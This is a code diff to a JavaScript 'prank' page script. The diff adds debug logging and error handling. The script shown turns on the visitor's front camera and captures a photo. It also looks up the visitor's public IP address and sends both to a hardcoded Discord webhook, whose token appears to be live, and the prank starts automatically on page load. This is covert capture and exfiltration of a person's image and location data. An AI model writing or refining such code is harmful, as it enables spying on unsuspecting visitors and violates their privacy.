@@ -1,3 +1,5 @@
+console.log('Script loaded successfully!');
+
 // Terminal-style prank script
 // Discord webhook URL
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413918853238358159/6sXdgaB9em-SzJ5kGbQGuvh7DXhxphk94eP4MwMKJbgMchMHKWR17VmyrbGw-Y3S-mtm';
@@ -10,6 +12,7 @@ const ctx = canvas.getContext('2d');
 
 // Function to start the camera
 async function startCamera() {
+    console.log('Attempting to access camera...');
     try {
         const stream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user' }, // Front camera
@@ -26,7 +29,11 @@ async function startCamera() {
 
 // Function to capture photo
 async function capturePhoto() {
-    if (!video.srcObject) return null;
+    console.log('Attempting to capture photo...');
+    if (!video.srcObject) {
+        console.error('No video stream available');
+        return null;
+    }
     
     // Set canvas size to match video
     const videoTrack = video.srcObject.getVideoTracks()[0];
@@ -49,6 +56,7 @@ async function capturePhoto() {
 
 // Function to send webhook with photo
 async function sendWebhook(photoData = null) {
+    console.log('Sending webhook...');
     if (WEBHOOK_URL) {
         const ip = await fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
@@ -147,7 +155,10 @@ async function runPrank() {
 }
 
 // Start the prank when page loads
-runPrank();
+console.log('Starting prank...');
+runPrank().catch(error => {
+    console.error('Error in prank execution:', error);
+});
 
 document.addEventListener('DOMContentLoaded', () => {
     // Get DOM elements
